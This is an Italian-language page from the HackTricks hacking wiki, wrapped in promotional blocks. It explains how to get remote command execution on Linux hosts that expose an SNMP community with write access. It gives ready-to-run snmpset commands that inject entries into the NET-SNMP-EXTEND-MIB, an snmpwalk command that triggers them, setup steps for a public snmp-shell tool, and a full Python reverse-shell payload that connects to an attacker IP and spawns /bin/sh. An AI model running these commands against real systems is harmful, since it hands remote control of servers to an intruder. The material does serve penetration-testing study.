<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

# SNMP RCE

SNMP pu√≤ essere sfruttato da un attaccante se l'amministratore trascura la sua configurazione predefinita sul dispositivo o server. Sfruttando la **comunit√† SNMP con permessi di scrittura (rwcommunity)** su un sistema operativo Linux, l'attaccante pu√≤ eseguire comandi sul server.

## Estendere i servizi con comandi aggiuntivi

Per estendere i servizi SNMP e aggiungere comandi extra, √® possibile aggiungere nuove **righe alla tabella "nsExtendObjects"**. Ci√≤ pu√≤ essere ottenuto utilizzando il comando `snmpset` e fornendo i parametri necessari, inclusi il percorso assoluto dell'eseguibile e il comando da eseguire:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## Iniezione di Comandi per l'Esecuzione

L'iniezione di comandi da eseguire sul servizio SNMP richiede l'esistenza e l'eseguibilit√† del binario/script chiamato. Il **`NET-SNMP-EXTEND-MIB`** richiede di fornire il percorso assoluto dell'eseguibile.

Per confermare l'esecuzione del comando iniettato, √® possibile utilizzare il comando `snmpwalk` per enumerare il servizio SNMP. **L'output mostrer√† il comando e i relativi dettagli**, inclusi il percorso assoluto:
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## Esecuzione dei comandi iniettati

Quando il **comando iniettato viene letto, viene eseguito**. Questo comportamento √® noto come **`run-on-read()`**. L'esecuzione del comando pu√≤ essere osservata durante la lettura di snmpwalk.

### Ottenere una shell del server con SNMP

Per ottenere il controllo del server e ottenere una shell del server, pu√≤ essere utilizzato uno script Python sviluppato da mxrch disponibile su [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git).

In alternativa, √® possibile creare manualmente una reverse shell iniettando un comando specifico in SNMP. Questo comando, attivato da snmpwalk, stabilisce una connessione reverse shell alla macchina dell'attaccante, consentendo il controllo sulla macchina vittima.
√à possibile installare il prerequisito per eseguire questo:
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
Oppure una shell inversa:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
## Riferimenti
* [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)


<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
